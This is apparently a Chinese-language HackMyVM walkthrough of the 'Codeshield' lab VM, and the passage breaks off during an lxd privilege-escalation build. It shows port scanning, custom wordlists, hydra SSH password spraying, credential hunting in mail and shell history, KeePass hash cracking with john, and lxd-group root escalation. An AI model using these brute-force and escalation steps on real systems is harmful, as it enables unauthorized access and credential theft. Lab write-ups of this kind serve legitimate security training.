---
title: HMV-Codeshield
description: 'This VM will help prepare you for something like OSCP.'
pubDate: 2026-01-12
image: /machine/Codeshield.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux Machine
---

![](/image/hmvmachines/Codeshield-1.png)

# 信息收集
## IP定位
```plain
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"
192.168.0.100   08:00:27:21:94:af       (Unknown)
```

## nmap扫描
```plain
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 01:17 EST
Nmap scan report for 192.168.0.100
Host is up (0.0011s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
| -rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
|_-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
|_  256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
25/tcp    open  smtp          Postfix smtpd
|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error\x0D
80/tcp    open  http          nginx
|_http-title: Did not follow redirect to https://192.168.0.100/
110/tcp   open  pop3          Dovecot pop3d
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING TOP CAPA RESP-CODES UIDL
143/tcp   open  imap          Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: post-login IMAP4rev1 listed Pre-login have more ENABLE capabilities ID OK LOGIN-REFERRALS LOGINDISABLEDA0001 SASL-IR IDLE LITERAL+ STARTTLS
443/tcp   open  ssl/http      nginx
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
| http-robots.txt: 1 disallowed entry 
|_/
|_ssl-date: TLS randomness does not represent time
|_http-title: CodeShield - Home
465/tcp   open  ssl/smtp      Postfix smtpd
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
587/tcp   open  smtp          Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
993/tcp   open  imaps?
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: post-login IMAP4rev1 listed Pre-login have more ENABLE capabilities ID OK LOGIN-REFERRALS AUTH=LOGINA0001 SASL-IR IDLE LITERAL+ AUTH=PLAIN
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
995/tcp   open  pop3s?
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN LOGIN) PIPELINING TOP CAPA RESP-CODES UIDL
2222/tcp  open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
|_  256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
3389/tcp  open  ms-wbt-server xrdp
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2a:49:28:84:25:99:62:e8:29:68:88:d6:36:be:8e:d6 (ECDSA)
|_  256 20:9f:5b:3f:52:eb:a9:60:27:39:3b:e7:d8:17:8d:70 (ED25519)
Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds

```



根据110/tcp   open  pop3          Dovecot pop3d

| ssl-cert: Subject: commonName=mail.codeshield.hmv

### 添加hosts
```plain
192.168.0.100 mail.codeshield.hmv
```

## 21端口ftp-anonymous
```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield]
└─# ftp 192.168.0.100
Connected to 192.168.0.100.
220 (vsFTPd 3.0.5)
Name (192.168.0.100:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget CodeShield_pitch_deck.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||65107|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2349914 bytes).
100% |***************************************************************|  2294 KiB  147.58 MiB/s    00:00 ETA
226 Transfer complete.
2349914 bytes received in 00:00 (144.86 MiB/s)
mget Information_Security_Policy.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||46568|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |***************************************************************| 67520      314.10 MiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (124.06 MiB/s)
mget The_2023_weak_password_report.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||35440|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |***************************************************************|   221 KiB  182.69 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (146.60 MiB/s)
ftp> bye
221 Goodbye.
```



###  Step 1：把 PDF 转成纯文本（
`pdftotext CodeShield_pitch_deck.pdf pitch.txt  
pdftotext Information_Security_Policy.pdf policy.txt  
pdftotext The_2023_weak_password_report.pdf weakpass.txt`

### Step 2：根据整理的文本做字典
#### ✅ 一、账号用户名列表（users.txt）
基于你给的 PDF、Pitch Deck、Policy 中的**姓名规则与组织结构**，企业最常见三种格式：

##### 🔹 格式 1：`first.last`
```plain
jessica.carlson
j.carlson
jcarlson
admin
administrator
itadmin
support
helpdesk
finance
invest
hr
ceo
```

##### 🔹 格式 2：常见员工名（根据文档推断）
```plain
jessica
carlson
codeshield
guest
test
user
info
sales
marketing
security
```

👉 **保存为 **`**users.txt**`

---

#### ✅ 二、密码字典（pass.txt）
##### 🔐 1️⃣ 来自《Weak Password Report》的高命中组合
```plain
Password123!
Password12345
Hairdresser1!
Greatplace2work!
Xxxxxxxxx001
Xxxxxxxxx002
Xxxxxxxxxx01
1qa2ws3ed4rf
```

---

##### 🎬 2️⃣ 影视 / 流行文化（报告中明确提到）
```plain
Yoda123!
Starwars123
Loki2023!
Thor2023
Batman123!
Matrix123
Rocky2023
Ironman!
```

---

##### 📅 3️⃣ 企业常见“年份 + 符号”
```plain
Summer2023!
May2023!
August2023!
Winter2022!
```

---

##### 👩‍💼 4️⃣ CEO / 管理层常见弱口令模式（非常真实）
```plain
Jessica2023!
Carlson2023!
Jessica@123
Carlson@123
Welcome123!
Welcome@2023
```

---

##### 🧠 5️⃣ IT / 默认 / 服务账号
```plain
admin123!
admin@123
Admin2023!
Root123!
P@ssw0rd
ChangeMe123!
```

👉 **保存为 **`**passwd.txt**`

## 22端口ssh-密码喷洒
上面做的字典喷洒失败了

## https://mail.codeshield.hmv
![](/image/hmvmachines/Codeshield-2.png)

提取人名作为字典

```plain
Angelina Johnson
John Doe
Bob Watson
Jennifer Cruise
Jessica Carlson 
Mohammed Mansour 
Xian Tan 
Annabella Cocci 
Thomas Mitchell
Patrick Early
Kevin Valdez


Angelina
Johnson
John
Doe
Bob
Watson
Jennifer
Cruise
Jessica
Carlson 
Mohammed
Mansour 
Xian
Tan 
Annabella
Cocci 
Thomas
Mitchell
Patrick
Early
Kevin
Valdez

angelina
johnson
john
doe
bob
watson
jennifer
cruise
jessica
carlson 
mohammed
mansour 
xian
tan 
annabella
cocci 
thomas
mitchell
patrick
early
kevin
valdez
```

继续爆破

```plain
[22][ssh] host: 192.168.0.100   password: Password123!
[STATUS] attack finished for 192.168.0.100 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-12 03:44:18
```

？？？wdf

## 22端口ssh-登录
直接ssh登录试试

root/Password123!

还真登录进去了

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield]
└─# ssh 192.168.0.100     
The authenticity of host '192.168.0.100 (192.168.0.100)' can't be established.
ED25519 key fingerprint is SHA256:p41YgA92zNuiXv+R9wkRqYw3Z4EChD83xgSfLoouuFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.100' (ED25519) to the list of known hosts.
root@192.168.0.100's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@svr04:~#
```

搜了一圈没发现什么

## 22222端口ssh-爆破
### 🔴 OpenSSH 6.0p1（22 端口）
+ 发布年份：**2012**
+ 对应系统：Debian 7（Wheezy）
+ 特点：
    - 支持很多 **已废弃的加密算法**
    - 不支持或默认不启用现代安全特性
    - 存在大量**历史安全问题**
+ 现实意义：
    - 经常用于 **老系统 / legacy 服务**
    - 在安全审计中通常是 **高风险项**

📌 你看到它本身，就已经是一个**安全红旗**

---

### 🟢 OpenSSH 8.9p1（22222 端口）
+ 发布年份：2022+
+ 对应系统：Ubuntu（较新 LTS）
+ 特点：
    - 默认禁用弱算法（如 `ssh-rsa`）
    - 强制更安全的密钥交换
    - 对暴力破解和中间人攻击防护更好
+ 使用非 22 端口：
    - **不是安全手段**
    - 只是减少无脑扫描噪音

📌 这是“现代标准 SSH”



```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield]  
└─# hydra -L users.txt -P passwd.txt ssh://192.168.0.100 -f -V -s 22222 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-12 03:54:47 

```

得了还是爆破不出来

## 用户名字典生成
通过看wp得知一款工具

现在用[**username-anarchy**](https://github.com/urbanadventurer/username-anarchy)工具，生成了一个包含潜在用户的更大列表。

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield]  
└─# cat users.txt
Angelina Johnson 
John Doe 
Bob Watson 
Jennifer Cruise 
Jessica Carlson  
Mohammed Mansour  
Xian Tan  
Annabella Cocci  
Thomas Mitchell 
Patrick Early 
Kevin Valdez 
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop/tools/username-anarchy]
└─# ./username-anarchy --input-file ../../hmv/Codeshield/users.txt > anarchy_users
```

```plain
──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield]
└─# hydra -L anarchy_users -P passwd.txt ssh://192.168.0.100 -f -s 22222 -V  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-12 04:35:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5115 login tries (l:155/p:33), ~320 tries per task
[DATA] attacking ssh://192.168.0.100:22222/

```

最后爆破出来为valdezk/Greatplace2work!

## valdezk登录
```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield]
└─# ssh valdezk@192.168.0.100 -p 22222
The authenticity of host '[192.168.0.100]:22222 ([192.168.0.100]:22222)' can't be established.
ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.0.100]:22222' (ED25519) to the list of known hosts.
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
valdezk@192.168.0.100's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 12 09:38:38 AM UTC 2026

  System load:  0.01416015625      Processes:               235
  Usage of /:   29.3% of 47.93GB   Users logged in:         0
  Memory usage: 58%                IPv4 address for enp0s3: 192.168.0.100
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '24.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


valdezk@codeshield:~$ 

```

# 权限提升
## 用户mitchellt
```plain
valdezk@codeshield:~$ grep -ri password
[...]
.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv/Trash:Password: D@taWh1sperer!
[...]
```

```plain
hydra -L anarchy_users -p 'D@taWh1sperer!' ssh://192.168.0.100 -s 22222 -f -V

[ATTEMPT] target 192.168.0.100 - login "mitchellt" - pass "D@taWh1sperer!" - 122 of 156 [child 11] (0/1)
[22222][ssh] host: 192.168.0.100   login: mitchellt   password: D@taWh1sperer!
[STATUS] attack finished for 192.168.0.100 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-12 04:48:23
```

通过爆破得出用户是mitchellt

```plain
valdezk@codeshield:~$ su mitchellt
Password: 
mitchellt@codeshield:/home/valdezk$ 
```

```plain
mitchellt@codeshield:/home$ cd ~
mitchellt@codeshield:~$ cat user.txt 
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗  
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗ 
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║ 
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║ 
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝ 
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝  
        @@@@@@@   @@@                       
           @@@@@@@                          

  _______________________________________________________________________________________________________
 |  _USER FLAG!________________________________________________________________________________________  |
 | |                                                                                                   | |
 | | Your_password_is_the_key_to_your_digital_life                                                     | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________| 
```

## 用户earlyp
earlyp/EARL!YP7DeVel@OP

利用mitchellt翻查history中发现

```plain
mitchellt@codeshield:/home$ history
    1  echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
    2  echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
```

## 提权root
### (方法一:kdbx文件)
信息搜集可以找到一个`.kdbx`文件，破解一下即可得到root密码：

| ```plain earlyp@codeshield:~$ grep -Pnir password ```  |
| --- |


找到一个密码文件：

| ```plain .cache/keepassxc/keepassxc.ini:2:LastActiveDatabase=/home/earlyp/Documents/Passwords.kdbx .cache/keepassxc/keepassxc.ini:4:LastDatabases=/home/earlyp/Documents/Passwords.kdbx .cache/keepassxc/keepassxc.ini:6:LastOpenedDatabases=/home/earlyp/Documents/Passwords.kdbx ```  |
| --- |


拷贝到本地进行破解：

```plain
earlyp@codeshield:~$ cd Documents
earlyp@codeshield:~/Documents$ ls
Passwords.kdbx
```

| ```plain ┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield] └─# scp -P 22222 earlyp@192.168.0.100:~/Documents/Passwords.kdbx .                @@@                                   @@@@@@@@@  @@@@@@                       @@@@@@@@@@@@@@          (@@                  @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                     @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗                @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║                @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║                  @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝                   @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝                       @@@@@@@   @@@                                   @@@@@@@                                                               _______________________________________________________________________________________________________  |  _WARNING: This system is restricted to authorized users!___________________________________________  |  | |                                                                                                   | |  | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |  | |                                                                                                   | |  | | This system is restricted to authorized users.                                                    | |   | | Individuals who attempt unauthorized access will be prosecuted.                                   | |   | | If you're unauthorized, terminate access now!                                                     | |   | |                                                                                                   | |  | |                                                                                                   | |  | |___________________________________________________________________________________________________| |  |_______________________________________________________________________________________________________| earlyp@192.168.0.100's password:  Passwords.kdbx                                                            100% 1918   878.7KB/s   00:00  ┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield] └─# keepass2john Passwords.kdbx > hash                                                                                                              ┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield] └─# john hash --wordlist=pass  Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 3225806 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 4 OpenMP threads fopen: pass: No such file or directory                                                                                                              ┌──(root㉿kali)-[/home/kali/Desktop/hmv/Codeshield] └─# john hash --wordlist=../../wordlists/kali/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 3225806 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ```  |
| --- |


那只能`rockyou`了，这里快速剽窃了一下密码：

| ```plain mandalorian ```  |
| --- |


去在线的管理器上打开文件看一下密码：

[https://app.keeweb.info/](https://app.keeweb.info/)

![](/image/hmvmachines/Codeshield-3.png)

| ```plain root:7%z5,c9=w6[x8= ```  |
| --- |


切换用户拿到rootshell！

| ```plain earlyp@codeshield:~/Documents$ su - root Password:  root@codeshield:~# ls -la total 92 drwx------  9 root root 4096 Aug 26  2023 . drwxr-xr-x 19 root root 4096 Aug 22  2023 .. -rw-------  1 root root    0 Aug 30  2023 .bash_history -rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc drwx------  2 root root 4096 Aug 28  2023 .cache drwxr-xr-x  2 root root 4096 Aug 26  2023 cowrie drwxr-xr-x  3 root root 4096 Aug 26  2023 .iredmail drwx------  3 root root 4096 Aug 23  2023 .launchpadlib -rw-------  1 root root   20 Aug 23  2023 .lesshst drwxr-xr-x  3 root root 4096 Aug 22  2023 .local -r--------  1 root root   45 Aug 26  2023 .my.cnf -rw-r--r--  1 root root   91 Aug 26  2023 .my.cnf-amavisd -rw-r--r--  1 root root   92 Aug 26  2023 .my.cnf-fail2ban -rw-r--r--  1 root root   93 Aug 26  2023 .my.cnf-iredadmin -rw-r--r--  1 root root   91 Aug 26  2023 .my.cnf-iredapd -rw-r--r--  1 root root   93 Aug 26  2023 .my.cnf-roundcube -r--------  1 root root   89 Aug 26  2023 .my.cnf-vmail -r--------  1 root root   94 Aug 26  2023 .my.cnf-vmailadmin -rw-r--r--  1 root root  161 Jul  9  2019 .profile -rw-r--r--  1 root root 2528 Aug 26  2023 root.txt -rw-r--r--  1 root root   66 Aug 26  2023 .selected_editor drwx------  4 root root 4096 Aug 22  2023 snap drwx------  2 root root 4096 Aug 22  2023 .ssh -rw-r--r--  1 root root    0 Aug 22  2023 .sudo_as_admin_successful -rw-r--r--  1 root root  290 Aug 26  2023 .wget-hsts root@codeshield:~# cat root.txt                @@@                                   @@@@@@@@@  @@@@@@                       @@@@@@@@@@@@@@          (@@                  @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                     @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗                @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║                @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║                  @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝                   @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝                       @@@@@@@   @@@                                   @@@@@@@                                                               _______________________________________________________________________________________________________  |  _ROOT FLAG!________________________________________________________________________________________  |  | |                                                                                                   | |  | | Educate_your_employees_on_password_safety                                                         | |  | |                                                                                                   | |  | |___________________________________________________________________________________________________| |  |_______________________________________________________________________________________________________| ```  |
| --- |


### (方法2:lxd)
原因是一个特殊的lxd组权限：

| ```plain earlyp@codeshield:~$ id uid=1000(earlyp) gid=1000(earlyp) groups=1000(earlyp),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd) ```  |
| --- |


参考：

https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html#with-internet

[https://github.com/saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)

| ```plain ┌──(kali💀kali)-[~/temp/codeshield] └─$ git clone https://github.com/saghul/lxd-alpine-builder Cloning into 'lxd-alpine-builder'... remote: Enumerating objects: 50, done. remote: Counting objects: 100% (8/8), done. remote: Compressing objects: 100% (6/6), done. remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42 (from 1) Receiving objects: 100% (50/50), 3.11 MiB | 3.21 MiB/s, done. Resolving deltas: 100% (15/15), done.  ┌──(root㉿kali)-[/home/kali/Desktop/tools] └─# cd lxd-alpine-builder                                ┌──(root㉿kali)-[/home/kali/Desktop/tools/lxd-alpine-builder] └─# sudo ./build-alpine Determining the latest release... v3.23 Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.8/main/x86 Downloading alpine-keys-2.1-r1.apk alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK Verified OK   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100  3264  100  3264    0     0    831      0  0:00:03  0:00:03 --:--:--   832 --2025-05-30 04:04:20--  http://alpine.mirror.wearetriple.com/MIRRORS.txt Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.24, 2a00:1f00:dc06:10::6 Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.24|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3264 (3.2K) [text/plain] Saving to: ‘/home/kali/temp/codeshield/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’  /home/kali/temp/codeshield/lxd-alpine-builder/r 100%[====================================================================================================>]   3.19K  --.-KB/s    in 0s        2025-05-30 04:04:21 (9.01 MB/s) - ‘/home/kali/temp/codeshield/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [3264/3264]  Selecting mirror http://mirrors.ocf.berkeley.edu/alpine//v3.8/main fetch http://mirrors.ocf.berkeley.edu/alpine//v3.8/main/x86/APKINDEX.tar.gz (1/18) Installing musl (1.1.19-r11) (2/18) Installing busybox (1.28.4-r3) Executing busybox-1.28.4-r3.post-install (3/18) Installing alpine-baselayout (3.1.0-r0) Executing alpine-baselayout-3.1.0-r0.pre-install Executing alpine-baselayout-3.1.0-r0.post-install (4/18) Installing openrc (0.35.5-r5) Executing openrc-0.35.5-r5.post-install (5/18) Installing alpine-conf (3.8.0-r0) (6/18) Installing libressl2.7-libcrypto (2.7.5-r0) (7/18) Installing libressl2.7-libssl (2.7.5-r0) (8/18) Installing libressl2.7-libtls (2.7.5-r0) (9/18) Installing ssl_client (1.28.4-r3) (10/18) Installing zlib (1.2.11-r1) (11/18) Installing apk-tools (2.10.6-r0) (12/18) Installing busybox-suid (1.28.4-r3) (13/18) Installing busybox-initscripts (3.1-r4) Executing busybox-initscripts-3.1-r4.post-install 